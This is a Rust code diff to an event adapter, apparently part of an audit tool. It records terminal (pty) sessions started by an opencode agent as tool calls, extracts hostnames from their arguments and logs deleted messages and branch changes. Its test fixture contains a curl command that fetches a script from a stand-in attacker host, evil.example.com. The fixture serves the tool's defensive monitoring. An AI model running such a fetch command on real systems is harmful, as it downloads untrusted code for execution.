@@ -154,6 +154,79 @@ pub fn parse(env: &Envelope, capture: &CaptureCfg) -> Vec<Event> {
                 .map(String::from);
             vec![ev]
         }
+        // A pty is a process, and it becomes a `ToolUse` rather than a
+        // `Session` note for one reason: "what did this session run" has to be
+        // one query. A pty that landed in `Session.detail` would be a command
+        // execution invisible to every query about command executions — which
+        // is the shape of hole worth forwarding it to close in the first place.
+        //
+        // `pre`/`post` for created/exited, so it pairs the way tool calls do,
+        // through `meta.tool_use_id`. `pty.exited` carries no `sessionID` —
+        // only the pty's own id — so that id is the whole join.
+        "pty.created" | "pty.exited" => {
+            let phase = if event == "pty.created" {
+                "pre"
+            } else {
+                "post"
+            };
+            // `pty.created` wraps the whole `Pty` in `info`; `pty.exited`
+            // reports `id` and `exitCode` flat. One shape from here down.
+            let props = props.get("info").unwrap_or(&props).clone();
+            // The command and its args as one line, purely so the FQDN
+            // extractor sees what was actually invoked: opencode splits the
+            // program from its arguments, and a host named in `args` is
+            // invisible to a scan of `command` alone.
+            let line = {
+                let mut s = props
+                    .get("command")
+                    .and_then(Value::as_str)
+                    .unwrap_or_default()
+                    .to_string();
+                for a in props
+                    .get("args")
+                    .and_then(Value::as_array)
+                    .into_iter()
+                    .flatten()
+                {
+                    if let Some(a) = a.as_str() {
+                        s.push(' ');
+                        s.push_str(a);
+                    }
+                }
+                s
+            };
+            let fqdns = crate::adapters::extract_net_for_tool(
+                "pty",
+                &serde_json::json!({
+                    "command": line,
+                }),
+            );
+            // Non-zero is a failure, and 0 is not: an absent code is neither,
+            // which is what `pty.created` has.
+            let error = props
+                .get("exitCode")
+                .and_then(Value::as_i64)
+                .filter(|c| *c != 0)
+                .map(|c| format!("exit status {c}"));
+            let mut ev = mk(EventKind::ToolUse {
+                tool: "pty".into(),
+                phase: phase.into(),
+                input: if capture.tool_inputs {
+                    crate::adapters::cap_value(props.clone(), max)
+                } else {
+                    Value::Null
+                },
+                output: Value::Null,
+                error,
+                // opencode reports neither the duration nor an interrupt.
+                duration_ms: None,
+                interrupted: false,
+                files: vec![],
+                fqdns,
+            });
+            ev.meta.tool_use_id = props.get("id").and_then(Value::as_str).map(String::from);
+            vec![ev]
+        }
         "file.edited" | "file.watcher.updated" => {
             let path = props
                 .get("file")
@@ -185,7 +258,14 @@ pub fn parse(env: &Envelope, capture: &CaptureCfg) -> Vec<Event> {
         e if e.starts_with("session.")
             || e == "todo.updated"
             || e == "server.connected"
-            || e == "installation.updated" =>
+            || e == "installation.updated"
+            // A message deleted from a live session: the transcript is the
+            // record, and this is the only notice part of it stopped existing.
+            || e == "message.removed"
+            // Which branch the session's `cwd` was on. A file edit means one
+            // thing on a topic branch and another on the release branch, and
+            // nothing else reports the difference.
+            || e == "vcs.branch.updated" =>
         {
             vec![mk(EventKind::Session {
                 action: event.into(),
@@ -510,6 +590,73 @@ mod tests {
             &CaptureCfg::default(),
         );
         assert!(matches!(&events[0].kind, EventKind::Raw { .. }));
+    }
+
+    /// A pty is a command with a pid that never passes through
+    /// `tool.execute.*`, so it is the one way to run something and leave no
+    /// trace in the tool record. It becomes a `ToolUse` for that reason: as a
+    /// `Session` note it would be a command execution invisible to every
+    /// query about command executions.
+    #[test]
+    fn a_terminal_is_a_tool_call_with_a_pid() {
+        let events = adapters::parse(
+            env(json!({
+                "event": "pty.created", "sessionID": "oc1", "cwd": "/repo",
+                "properties": {"info": {
+                    "id": "pty_1", "title": "shell", "command": "curl",
+                    "args": ["-sL", "https://evil.example.com/x.sh"],
+                    "cwd": "/repo", "status": "running", "pid": 4242
+                }}
+            })),
+            &CaptureCfg::default(),
+        );
+        let EventKind::ToolUse {
+            tool,
+            phase,
+            input,
+            fqdns,
+            error,
+            ..
+        } = &events[0].kind
+        else {
+            panic!("{:?}", events[0].kind)
+        };
+        assert_eq!((tool.as_str(), phase.as_str()), ("pty", "pre"));
+        assert_eq!(input["pid"], 4242);
+        // The host is in `args`, not in `command`: opencode splits the program
+        // from its arguments, so scanning `command` alone finds nothing.
+        assert_eq!(fqdns, &vec!["evil.example.com".to_string()]);
+        assert!(error.is_none());
+        assert_eq!(events[0].meta.tool_use_id.as_deref(), Some("pty_1"));
+        // The session's, not the pty's — a terminal is not a session.
+        assert_eq!(events[0].session_id.as_deref(), Some("oc1"));
+
+        // `pty.exited` reports its fields flat, and carries no sessionID at
+        // all: the pty id is the whole join back to the `created`.
+        let events = adapters::parse(
+            env(json!({
+                "event": "pty.exited",
+                "properties": {"id": "pty_1", "exitCode": 137}
+            })),
+            &CaptureCfg::default(),
+        );
+        let EventKind::ToolUse { phase, error, .. } = &events[0].kind else {
+            panic!()
+        };
+        assert_eq!(phase, "post");
+        assert_eq!(error.as_deref(), Some("exit status 137"));
+        assert_eq!(events[0].meta.tool_use_id.as_deref(), Some("pty_1"));
+
+        // Zero is not a failure. An absent code is neither, which is what
+        // `pty.created` has — asserted above.
+        let events = adapters::parse(
+            env(json!({"event": "pty.exited", "properties": {"id": "p", "exitCode": 0}})),
+            &CaptureCfg::default(),
+        );
+        let EventKind::ToolUse { error, .. } = &events[0].kind else {
+            panic!()
+        };
+        assert!(error.is_none());
     }
 
     /// `permission.updated` is opencode's ask — the event carrying the tool
